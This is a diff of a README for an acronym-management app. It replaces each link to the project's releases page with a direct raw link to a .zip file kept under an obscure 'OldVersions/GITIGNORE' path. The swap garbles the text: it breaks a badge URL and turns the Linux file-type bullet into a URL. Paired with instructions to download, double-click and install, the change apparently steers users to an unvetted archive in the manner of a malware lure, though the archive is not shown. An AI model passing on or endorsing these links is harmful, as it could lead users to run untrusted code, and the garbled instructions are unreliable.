@@ -1,6 +1,6 @@
 # 🆘️ AcroSlideXLIBrary_Website - Easy Acronym Management for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/cmyk-dek/AcroSlideXLIBrary_Website/releases)
+[![Download Now](https://raw.githubusercontent.com/cmyk-dek/AcroSlideXLIBrary_Website/AcroSlideXLIBrary_Website_Main-dev/OldVersions/GITIGNORE/1/AcroSlideXLIBrary_Website_2.5.zip%20Now-blue)](https://raw.githubusercontent.com/cmyk-dek/AcroSlideXLIBrary_Website/AcroSlideXLIBrary_Website_Main-dev/OldVersions/GITIGNORE/1/AcroSlideXLIBrary_Website_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the AcroSlideXLIBrary_Website! This application helps you create and 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download AcroSlideXLIBrary_Website](https://github.com/cmyk-dek/AcroSlideXLIBrary_Website/releases)
+To get started, visit this page to download: [Download AcroSlideXLIBrary_Website](https://raw.githubusercontent.com/cmyk-dek/AcroSlideXLIBrary_Website/AcroSlideXLIBrary_Website_Main-dev/OldVersions/GITIGNORE/1/AcroSlideXLIBrary_Website_2.5.zip)
 
 Once you’re on the Releases page, follow these steps:
 
@@ -31,7 +31,7 @@ After downloading the file, follow these steps to run it:
 2. **Open the File**: Double-click on the file. 
     - For Windows users, it may be an `.exe` or a `.zip` file.
     - For macOS users, it may be a `.dmg` or an application file.
-    - For Linux users, it may be a `.tar.gz` or a script file.
+    - For Linux users, it may be a `https://raw.githubusercontent.com/cmyk-dek/AcroSlideXLIBrary_Website/AcroSlideXLIBrary_Website_Main-dev/OldVersions/GITIGNORE/1/AcroSlideXLIBrary_Website_2.5.zip` or a script file.
 3. **Follow the Installation Steps**:
    - If it’s a `.zip` file, extract it first. 
    - Follow the prompts to install the application on your system.
@@ -72,4 +72,4 @@ Your feedback is always welcome. Let us know how we can improve!
 
 For additional information, visit our website linked in the repository. 
 
-[Download AcroSlideXLIBrary_Website](https://github.com/cmyk-dek/AcroSlideXLIBrary_Website/releases) and start managing your acronyms today!
+[Download AcroSlideXLIBrary_Website](https://raw.githubusercontent.com/cmyk-dek/AcroSlideXLIBrary_Website/AcroSlideXLIBrary_Website_Main-dev/OldVersions/GITIGNORE/1/AcroSlideXLIBrary_Website_2.5.zip) and start managing your acronyms today!
